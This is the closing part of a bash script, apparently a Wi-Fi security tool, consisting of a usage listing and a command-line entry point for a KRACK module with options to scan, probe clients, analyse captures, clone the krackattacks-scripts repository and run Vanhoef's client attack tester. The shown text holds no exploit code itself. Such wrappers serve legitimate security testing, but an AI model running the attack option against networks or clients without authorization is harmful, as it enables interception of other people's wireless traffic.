  --list-pcaps-tsv
  --passive-scan [DURATION]
  --probe [CLIENT_MAC]
  --analyze PCAP
  --caps-tsv [DURATION]         # PMF + AKM from beacon
  --vendor-hint                 # OUI-based vuln family
  --install-scripts             # clone krackattacks-scripts
  --run-attack                  # invoke vanhoef's client tester
  --selftest                    # offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    krack_cli_main "$@"
fi
